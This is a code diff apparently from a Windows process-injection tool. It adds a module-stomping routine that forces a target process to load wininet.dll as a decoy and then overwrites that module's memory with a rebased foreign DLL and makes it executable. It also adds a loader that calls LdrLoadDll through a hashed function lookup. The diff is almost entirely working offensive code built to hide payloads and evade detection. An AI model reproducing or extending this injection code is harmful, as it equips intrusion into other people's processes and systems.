@@ -1,5 +1,5 @@
 #include "injector.hpp"
-
+#include "dll.hpp"
 
 injectorMethod mainInjector;
 
@@ -273,5 +273,120 @@ injectorMethod mainInjector;
         std::cout << "-------exiting findRemoteModule function -----" << "\n";
         return NULL;
     };
+    PVOID injectorMethod::moduleStompingDllRemote(std::wstring targetDllPath, int pid) {
+        HANDLE hProcess;
+        if (pid == 0) {
+            hProcess = (HANDLE)-1;
+        }
+        else {
+			hProcess = mainInjector.process(pid);
+        }
+
+        // 1. Load our target DLL into a local buffer
+        std::vector<BYTE> dllBuffer = ReadFileToBuffer(std::string(targetDllPath.begin(), targetDllPath.end()));
+        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer.data();
+        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBuffer.data() + dosHeader->e_lfanew);
+		std::wcout << "[+] Size of  " << targetDllPath << " Size: " << dllBuffer.size() << " bytes\n";
+        // 2. Load the "Sacrifice" DLL in the remote process
+        // We use wininet.dll as the decoy
+        wchar_t sacrificePath[] = L"C:\\windows\\system32\\wininet.dll";
+        std::string tmp = "C:\\windows\\system32\\wininet.dll";
+        std::vector<BYTE> sacrificeBuffer = ReadFileToBuffer(tmp);
+        std::cout << "[+] Size of C:\\windows\\system32\\wininet.dll: " << sacrificeBuffer.size() << " bytes\n";
+
+        PVOID remotePathBuf = mainInjector.vAlloc(hProcess, NULL, sizeof(sacrificePath));
+        mainInjector.wrMem(hProcess, remotePathBuf, (LPVOID)sacrificePath, sizeof(sacrificePath));
+
+        PVOID pLoadLibraryW = syscallHandler.getFunctionAddressByHash(L"kernel32.dll", 1606414609);
+        HANDLE hThread = mainInjector.ntThread(hProcess, (PTHREAD_START_ROUTINE)pLoadLibraryW, remotePathBuf);
+        mainInjector.waitForSingle(hThread);
+
+        // 3. Find where the sacrifice DLL landed in the remote process
+        HMODULE hRemoteSacrifice = (HMODULE)mainInjector.findRemoteModule(hProcess, L"wininet.dll");
+		std::cout << "[+] Sacrifice DLL loaded at: " << hRemoteSacrifice << "\n";
+        if (!hRemoteSacrifice) return NULL;
+
+        // 4. PREPARE THE STOMP LOCALLY
+        // We create a local "shadow" buffer to fix everything before sending it over
+        PVOID localShadow = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		std::cout << "[+] Allocated local shadow buffer at: " << localShadow << " for preparing the stomp\n";
+        // Copy Headers
+        memcpy(localShadow, dllBuffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
+
+        // Copy Sections
+        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+            memcpy((BYTE*)localShadow + section[i].VirtualAddress,
+                dllBuffer.data() + section[i].PointerToRawData,
+                section[i].SizeOfRawData);
+        }
+
+        // 5. FIXUPS (Relocations & Imports)
+        // IMPORTANT: We rebase the DLL to the REMOTE address, not the local shadow address
+        RebaseDllRemote((BYTE*)localShadow, ntHeaders, (uintptr_t)hRemoteSacrifice);
+		std::cout << "[+] Rebased DLL for remote base: " << hRemoteSacrifice << "\n";
+        ResolveImports((BYTE*)localShadow, ntHeaders);
+		std::cout << "[+] Resolved Imports for the DLL\n";
+
+        
+
+        // 6. STOMP: Overwrite the remote wininet.dll with our fixed target DLL
+        mainInjector.protectMemFlag(hProcess, hRemoteSacrifice, PAGE_READWRITE, ntHeaders->OptionalHeader.SizeOfImage);
+        mainInjector.wrMem(hProcess, hRemoteSacrifice, localShadow, ntHeaders->OptionalHeader.SizeOfImage);
+        mainInjector.protectMemFlag(hProcess, hRemoteSacrifice, PAGE_EXECUTE_READ, ntHeaders->OptionalHeader.SizeOfImage);
+
+        std::cout << "[+] Module stomped successfully at " << hRemoteSacrifice << "\n";
+        
+        /*typedef BOOL(WINAPI* f_DllMain)(HINSTANCE, DWORD, LPVOID);
+        auto DllMain = (f_DllMain)((BYTE*)hRemoteSacrifice + ntHeaders->OptionalHeader.AddressOfEntryPoint);
+		std::cout << "[+] Calling DllMain at: " << DllMain << "\n";
+        if (DllMain((HINSTANCE)hRemoteSacrifice, 1, NULL)) {
+            std::cout << "[+] DllMain initialized successfully.\n";
+        }
+        else {
+			std::cout << "[-] DllMain failed to initialize.\n";
+        }
+        */
+        auto& exceptionDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+
+        if (exceptionDir.Size > 0) {
+            auto* pRuntimeFunctions = reinterpret_cast<PRUNTIME_FUNCTION>(
+                (BYTE*)hRemoteSacrifice + exceptionDir.VirtualAddress
+                );
+            DWORD functionCount = exceptionDir.Size / sizeof(RUNTIME_FUNCTION);
+
+            // RtlAddFunctionTable tells Windows: "If a crash happens in this memory range, 
+            // use this table to find the handler."
+            if (RtlAddFunctionTable(pRuntimeFunctions, functionCount, (DWORD64)hRemoteSacrifice)) {
+                std::cout << "[+] Registered Exception Tables for stomped module.\n";
+            }
+        }
+        return hRemoteSacrifice;
+        /* 7. EXECUTE: Call the EntryPoint of the stomped DLL
+        PVOID remoteEntryPoint = (PVOID)((BYTE*)hRemoteSacrifice + ntHeaders->OptionalHeader.AddressOfEntryPoint);
+        std::cout << "[+] Stomped wininet.dll. returning base Adress: " << remoteEntryPoint << "\n";
+
+        mainInjector.ntThread(hProcess, (PTHREAD_START_ROUTINE)remoteEntryPoint, NULL);
+
+        VirtualFree(localShadow, 0, MEM_RELEASE);
+        return remoteEntryPoint;
+        */
+    }
+
+    HMODULE injectorMethod::myLdrLoadDll(std::wstring dllName) {
+
+        typedef NTSTATUS(NTAPI* f_LdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PHANDLE);
+        auto pLdrLoadDll = (f_LdrLoadDll)syscallHandler.getFunctionAddressByHash(L"ntdll.dll", 50846499);
+        UNICODE_STRING uStr;
+        RtlInitUnicodeString(&uStr, dllName.c_str());
+        HANDLE hMod = NULL;
+
+        // Load it properly (resolves all 50+ dependencies for .NET)
+        NTSTATUS status = pLdrLoadDll(NULL, 0, &uStr, &hMod);
+        if (status != 0) return NULL;
+		
+		return (HMODULE)hMod;
+    }
+
 
 
